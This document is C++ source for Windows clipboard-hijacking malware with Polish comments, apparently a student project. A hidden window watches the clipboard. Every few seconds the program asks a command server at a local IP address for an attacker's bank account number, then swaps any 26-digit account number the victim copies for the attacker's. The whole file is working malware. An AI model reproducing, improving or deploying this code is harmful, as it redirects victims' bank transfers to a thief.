#define WIN32_LEAN_AND_MEAN

#include <Windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdlib.h>
#include <time.h>
#pragma comment(lib, "Ws2_32.lib")

#define MAXL			26
#define DEFAULT_PORT	"27015"
#define DEFAULT_ADDR	"192.168.0.10"
#define DEAFULT_BUFLEN	512
#define REQUEST_DELAY_S	10.0

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow);
bool init(HINSTANCE hInstance);
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
void MoveToCb();
bool CheckIfAccountNumber(LPSTR str);
void CheckForVictim();
void GetAccountNumber();
bool init_winsock();

constexpr CHAR szClassName[] = "WirusMonitorujacy";
LPSTR bankAccount;
HWND hwndThis;
HWND hwndNextViewer;
time_t start, current;
bool bAset;
char sockbuf[DEAFULT_BUFLEN];

SOCKET ConnectSocket;
struct addrinfo *result = NULL, *ptr = NULL, hints, saClient;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	if (!init(hInstance)) return 1;
	if (!init_winsock()) return 2;
	int iSizeofSaClient = sizeof(saClient);

	MSG msg;

	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
		time(&current);
		double diff = difftime(current, start); // różnica czasu w sekundach
		if (diff >= REQUEST_DELAY_S)
		{
			// Wysłanie żądania do procesu nadawcy o konto bankowe
			// Connect to server.
			int iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
			if (iResult == SOCKET_ERROR) {
				//freeaddrinfo(result);
				closesocket(ConnectSocket);
				ConnectSocket = INVALID_SOCKET;
			}
			if (ConnectSocket != INVALID_SOCKET) {
				GetAccountNumber();
			}
			time(&start);
		}
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	WSACleanup();
	return 0;
}

bool init(HINSTANCE hInstance)
{
	WNDCLASSEX wc;

	wc.cbSize = sizeof(WNDCLASSEX);
	wc.style = 0;
	wc.lpfnWndProc = WndProc;
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0;
	wc.hInstance = hInstance;
	wc.hIcon = NULL;
	wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
	wc.hbrBackground = NULL;
	wc.lpszMenuName = NULL;
	wc.lpszClassName = szClassName;
	wc.hIconSm = NULL;

	if(!RegisterClassEx(&wc)) return false;

	hwndThis = CreateWindowEx(
		NULL,
		szClassName,
		"",
		WS_DISABLED,
		0, 0, 0, 0,
		NULL,
		NULL,
		hInstance,
		NULL
	);

	if (hwndThis == NULL) return false;
	if (!AddClipboardFormatListener(hwndThis)) return false;

	bankAccount = (char*)calloc(MAXL + 1, sizeof(char));
	bAset = false;
	time(&start);

	return true;
}

bool init_winsock()
{
	WSADATA wsadata;
	int iResult;
	WORD wersja;
	wersja = MAKEWORD(2, 2);
	iResult = WSAStartup(wersja, &wsadata);
	if (iResult != NO_ERROR)
		return false;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	// Remember to set address to the PC that server is on!!!
	char ac[80];
	gethostname(ac, sizeof(ac));

	iResult = getaddrinfo(DEFAULT_ADDR, DEFAULT_PORT, &hints, &result);
	if (iResult != 0) {
		WSACleanup();
		return false;
	}
	
	ConnectSocket = INVALID_SOCKET;
	// Attempt to connect to the first address returned by
	// the call to getaddrinfo
	ptr = result;
	// Create a SOCKET for connecting to server
	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
		ptr->ai_protocol);
	if (ConnectSocket == INVALID_SOCKET) {
		freeaddrinfo(result);
		WSACleanup();
		return false;
	}
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg)
	{
	case WM_CREATE:
		hwndNextViewer = SetClipboardViewer(hwnd);
		break;
	case WM_CLIPBOARDUPDATE:
		CheckForVictim();
		if (hwndNextViewer != NULL)
			SendMessage(hwndNextViewer, msg, wParam, lParam);
		break;
	case WM_CHANGECBCHAIN:
		if ((HWND)wParam == hwndNextViewer)
			hwndNextViewer = HWND(lParam);
		else
			if (hwndNextViewer != NULL)
				SendMessage(hwndNextViewer, msg, wParam, lParam);
		break;
	case WM_CLOSE:
		DestroyWindow(hwnd);
		break;
	case WM_DESTROY:
		ChangeClipboardChain(hwnd, hwndNextViewer);
		RemoveClipboardFormatListener(hwnd);
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hwnd, msg, wParam, lParam);
	}
	return 0;
}

void CheckForVictim()
{
	if (!bAset)
		return;
	OpenClipboard(hwndThis);
	HGLOBAL hCbMem = GetClipboardData(CF_TEXT);
	if (hCbMem != NULL) // jest tekst - sprawdzam czy to numer konta. Jeśli tak - zamiana.
	{
		HGLOBAL hProgMem = GlobalAlloc(GHND, GlobalSize(hCbMem));
		if (hProgMem != NULL)
		{
			LPSTR lpCbMem = LPSTR(GlobalLock(hCbMem));
			LPSTR lpProgMem = LPSTR(GlobalLock(hProgMem));
			lstrcpy(lpProgMem, lpCbMem);
			GlobalUnlock(hCbMem);
			// hProgMem - adres tymczasowej zmiennej w schowku
			if (CheckIfAccountNumber((LPSTR)hProgMem))
				MoveToCb();
			GlobalUnlock(hProgMem);
		}
	}

	CloseClipboard();
}

// Tylko przy obsłudze komunikatu!
void MoveToCb()
{
	// zaalokowanie pamięci globalnej
	
	HGLOBAL hGlMem = GlobalAlloc(GHND, (DWORD)MAXL + 1);
	HGLOBAL lpGlMem = GlobalLock(hGlMem);

	// skopiowanie naszego numeru konta do pam. globalnej
	memcpy(lpGlMem, bankAccount, MAXL + 1);
	GlobalUnlock(hGlMem);

	// podmiana schowka
	OpenClipboard(hwndThis);
	EmptyClipboard();
	SetClipboardData(CF_TEXT, hGlMem);
	CloseClipboard();
}

bool CheckIfAccountNumber(LPSTR str)
{
	if (strlen(str) == MAXL)
		for (int i = 0; i < MAXL; i++)
		{
			if (str[i] < '0' || str[i] > '9')
				return false;
		}
	return true;
}

void GetAccountNumber()
{
	int sockbuflen = DEAFULT_BUFLEN;
	int iResult;
	strcpy_s(sockbuf, "Dawaj numer konta!");

	// Send a request for account number
	iResult = send(ConnectSocket, sockbuf, (int)strlen(sockbuf), 0);
	if (iResult == SOCKET_ERROR) {
		closesocket(ConnectSocket);
		WSACleanup();
		return;
	}

	// Shutdown the connection for sending since no more data will be sent
	// The client can still use the ConnectSocket for receiving data
	iResult = shutdown(ConnectSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		closesocket(ConnectSocket);
		WSACleanup();
		return;
	}

	// Receive data
	iResult = recv(ConnectSocket, sockbuf, sockbuflen, 0);
	if (iResult > 0)
		//strcpy_s(bankAccount, sockbuf);
		if (CheckIfAccountNumber(sockbuf))
			memcpy_s(bankAccount, MAXL + 1, sockbuf, strlen(sockbuf));
	else if (iResult < 0)
		return;
	bAset = true;
	closesocket(ConnectSocket);
}